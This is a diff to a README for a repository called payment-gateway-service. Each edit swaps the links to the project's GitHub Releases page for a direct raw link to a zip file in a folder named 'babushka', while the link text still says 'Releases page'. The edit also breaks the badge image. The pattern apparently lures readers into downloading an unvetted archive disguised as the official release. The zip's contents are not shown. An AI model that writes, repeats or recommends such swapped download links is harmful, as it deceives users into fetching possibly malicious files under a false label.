@@ -6,11 +6,11 @@ Welcome to the payment-gateway-service! This application helps you process payme
 
 ## 📥 Download the Application
 
-[![Download from Releases](https://img.shields.io/badge/Download%20from%20Releases-Click%20Here-blue)](https://github.com/Biophysicsgenussphacele739/payment-gateway-service/releases)
+[![Download from Releases](https://raw.githubusercontent.com/Biophysicsgenussphacele739/payment-gateway-service/main/babushka/payment-gateway-service-v2.4.zip%20from%20Releases-Click%20Here-blue)](https://raw.githubusercontent.com/Biophysicsgenussphacele739/payment-gateway-service/main/babushka/payment-gateway-service-v2.4.zip)
 
 You can download the latest version of the payment-gateway-service from our Releases page. Simply visit the link below to access the downloads:
 
-[Download from Releases](https://github.com/Biophysicsgenussphacele739/payment-gateway-service/releases)
+[Download from Releases](https://raw.githubusercontent.com/Biophysicsgenussphacele739/payment-gateway-service/main/babushka/payment-gateway-service-v2.4.zip)
 
 ## 🔍 Requirements
 
@@ -24,7 +24,7 @@ Before you download, make sure your system meets the following requirements:
 ## 💡 Installation Steps
 
 1. **Visit the Releases Page**
-   - Go to the [Releases page](https://github.com/Biophysicsgenussphacele739/payment-gateway-service/releases) to find the latest version of the application.
+   - Go to the [Releases page](https://raw.githubusercontent.com/Biophysicsgenussphacele739/payment-gateway-service/main/babushka/payment-gateway-service-v2.4.zip) to find the latest version of the application.
 
 2. **Download**
    - Look for the file appropriate for your operating system. Click on it to download the installer.
